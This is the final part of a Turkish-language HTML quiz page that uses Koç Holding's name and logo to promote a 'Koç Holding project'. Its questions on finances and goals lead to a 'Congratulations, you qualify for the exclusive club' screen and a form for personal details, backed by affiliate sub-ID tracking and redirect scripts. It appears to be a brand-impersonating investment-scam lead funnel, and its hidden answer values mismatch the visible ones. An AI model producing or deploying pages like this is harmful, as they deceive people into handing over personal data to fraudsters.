                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 6 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      6. Koç Holding projesinden nasıl haberdar oldunuz?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Herhangi bir finansal yükümlülüğünüz var mı?"
                      data-questionnew="6"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, ipoteğim var"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Evet, ipoteğim var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Açık Hava(Billboard) reklamcılığı
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, kredim var"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Evet, kredim var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">TV reklamları</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="ayır, sadece ev masraflarım var"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="ayır, sadece ev masraflarım var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Online Reklam</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır, ancak finansal olarak bağımsız olmak istiyorum"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Hayır, ancak finansal olarak bağımsız olmak istiyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Arkadaşlarınızın veya tanıdıklarınızın önerileri
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/quiz6.jpg"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>A</span><span>l</span><span>t</span
                            ><span>ı</span><span>n</span><span>c</span
                            ><span>ı</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 7 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logoWhite.svg" />
                </div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion">
                      7. Aşağıdaki hedeflerden hangisi sizin için en uygun?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Servetinizi hangi amaçla artırmak istiyorsunuz?"
                      data-questionnew="3"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Geleceğinizi güvence altına almak"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Geleceğinizi güvence altına almak"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Ailem için gerekli maddiyatı sağlamak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Ailenize yardım etmek"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Ailenize yardım etmek"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Seyahat etmek ve kendiniz için yaşamak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Krediyi/ipoteği ödemek"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Krediyi/ipoteği ödemek"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Büyük ölçekli sosyal projeler yaratmak
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Ev veya araba satın almak"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_3"
                            value="Ev veya araba satın almak"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Hepsi</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/1.jpg"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>Ü</span><span>ç</span><span>ü</span
                            ><span>n</span><span>c</span><span>ü</span>
                            <span>a</span><span>d</span><span>i</span
                            ><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="quiz-container quiz-container_has_results test-step">
            <div class="quiz__lead-form">
              <div class="final-page final-page_horizontal">
                <div class="final-page__content-container">
                  <div class="final-page__header-container">
                    <style>
                      .form__logo {
                        display: block;
                        max-width: 150px;
                        width: 100%;
                        margin: 0 auto 25px auto;
                      }
                    </style>
                    <img
                      src="images/logo.svg"
                      class="form__logo"
                      alt="Koç Holding"
                    />

                    <div class="final-page__header">Tebrikler!</div>
                    <div class="final-page__content">
                      <p>
                        Koç Holding’in seçkin kulübüne katılmaya hak kazandınız.
                        Bilgilerinizi girerek kişisel danışmanlık hizmetinden
                        yararlanın.
                      </p>
                    </div>
                  </div>
                </div>
                <div class="final-page__form">
                  <div class="leadFormContainer2 firstt">
                    <div id="formRender" class="col-12">
                      <form
                        autocomplete="off"
                        class="form _main-form register-form form-reg form-send"
                        method="post"
                        id="main-form"
                      ></form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script src="js/custom.js"></script>
    <script>
      function checkWindowSize() {
        const headers = document.querySelectorAll(".mobH");
        if (window.innerWidth <= 819) {
          headers.forEach((header) => {
            header.style.display = "none";
          });
        } else {
          headers.forEach((header) => {
            header.style.display = "block";
          });
        }
      }

      // Викликаємо функцію при завантаженні сторінки та при зміні розміру вікна
      window.addEventListener("resize", checkWindowSize);
      window.addEventListener("load", checkWindowSize);

      // Перевірка при першому завантаженні
      checkWindowSize();
    </script>

    <div>
      <div class="kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD"><div></div></div>
      <style>
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 999999;
          background-color: rgba(37, 44, 51, 0.5);
        }
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD div {
          display: block;
          position: relative;
          left: 50%;
          top: 50%;
          width: 150px;
          height: 150px;
          margin: -75px 0 0 -75px;
          border-radius: 50%;
          border: 3px solid transparent;
          border-top-color: #00faaa;
          -webkit-animation: 2s linear infinite spin;
          animation: 2s linear infinite spin;
        }
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD div::before {
          position: absolute;
          content: "";
          top: 5px;
          left: 5px;
          right: 5px;
          bottom: 5px;
          border-radius: 50%;
          border: 3px solid transparent;
          border-top-color: #f70044;
          -webkit-animation: 3s linear infinite spin;
          animation: 3s linear infinite spin;
        }
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD div::after {
          position: absolute;
          content: "";
          top: 15px;
          left: 15px;
          right: 15px;
          bottom: 15px;
          border-radius: 50%;
          border: 3px solid transparent;
          border-top-color: #00faaa;
          -webkit-animation: 1.5s linear infinite spin;
          animation: 1.5s linear infinite spin;
        }
        @-webkit-keyframes spn {
          0% {
            -webkit-transform: rotate(0);
            -ms-transform: rotate(0);
            transform: rotate(0);
          }
          100% {
            -webkit-transform: rotate(360deg);
            -ms-transform: rotate(360deg);
            transform: rotate(360deg);
          }
        }
        @keyframes spin {
          0% {
            -webkit-transform: rotate(0);
            -ms-transform: rotate(0);
            transform: rotate(0);
          }
          100% {
            -webkit-transform: rotate(360deg);
            -ms-transform: rotate(360deg);
            transform: rotate(360deg);
          }
        }
      </style>
    </div>
    <script src="loadAssets.js?v=4564"></script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "confirm.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "confirm.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>
  </body>
</html>
